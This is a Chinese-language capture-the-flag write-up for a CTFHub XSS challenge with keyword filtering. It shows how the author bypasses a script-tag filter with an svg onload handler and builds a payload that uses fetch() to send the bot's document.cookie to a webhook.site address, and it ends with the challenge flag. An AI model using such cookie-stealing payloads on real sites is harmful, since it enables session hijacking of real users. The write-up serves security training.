【CTFHub】Web-XSS过滤关键词 Writeup

操作者：何芊宏 | 操作日期：2026.9.23 | 分类：CTF | 标签：CTFHub, Web, XSS, 关键词过滤, Webhook, OOB

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - XSS / 过滤关键词
  • 题目名称：过滤关键词
  • 提示：页面提供修改名称的功能，后端会过滤特定的关键词。目标是在绕过关键词过滤的同时，外带Bot的Cookie。

2. 解题思路与知识点

关键词过滤绕过原理：靶场通常会过滤黑名单中的关键词，如 script、alert、img 等。绕过策略包括更换等价标签（如用 svg 替代 script）、更换函数（如用 fetch 替代 new Image）、大小写混写或双写绕过。

颜色对应规则说明：

  • 红色：靶场过滤导致报错或失效的关键词。
  • 绿色：成功绕过过滤并完成外带的Payload片段。

3. 操作步骤

第一步：基础探测与验证过滤规则

在输入框输入标准Payload：

<script>alert(1)</script>

提交后页面无反应。按F12查看源码，发现 <script> 标签被过滤为空，页面显示 Hello, <>alert(1)，确认 script 关键词被直接过滤。

第二步：更换等价标签，验证漏洞存在

绕过 script 标签，使用 svg 标签及 onload 事件：

<svg onload=alert(1)>

提交后页面成功弹窗，证明漏洞利用点存在，且 svg、onload、alert 未被过滤。

第三步：构造外带Payload并发送机器人

结合前两关的经验，直接构造无空格、静默外带的Payload：

<svg/onload="fetch('//webhook.site/44f4f857-1f6f-4e34-bde8-2b92b25b7689/?c='+document.cookie)">

此Payload使用了svg标签绕过了script过滤，使用了fetch函数静默发送请求，使用了// 和 c=精简了长度。

提交后，复制浏览器完整URL，粘贴至 Send URL to Bot，点击Send。Webhook成功收到请求并获取Flag：

ctfhub{d13ed6f3bf97499f8ed98859}

提交至CTFHub，通关成功。

4. 踩坑记录与复盘

  • 坑1：script 标签被直接过滤。输入 <script>alert(1)</script> 后，script 标签消失，导致浏览器把 <>alert(1) 当作纯文本。解决办法是使用 svg 或 img 等替代标签。
  • 坑2：思维定势导致多走弯路。在经历前几关的多次失败后，容易对长Payload产生不信任。本次直接使用了精简策略，一步到位，未发生长度截断。这说明在真实测试中，前期的经验复用能大幅提升效率。
  • 坑3：避开引号与空格冲突。通过使用斜杠 / 代替空格，并在Webhook地址外层使用双引号而非单引号，成功避免了浏览器地址栏的自动转码问题。

5. 知识总结

  • 关键词过滤绕过策略：当遇到黑名单过滤（如过滤 script、alert）时，优先考虑更换等价标签（svg、img、details）或更换函数（confirm、prompt、fetch）。
  • SVG 标签的优势：<svg/onload=...> 不需要像 <img> 那样依赖报错触发，且常被用于绕过对 script 和 img 的过滤。
  • 静默外带的综合运用：组合使用 fetch()（避免页面跳转和CSP拦截）、//（压缩URL长度）、c=（精简参数名），是完成 XSS OOB 外带的最优实践方案。
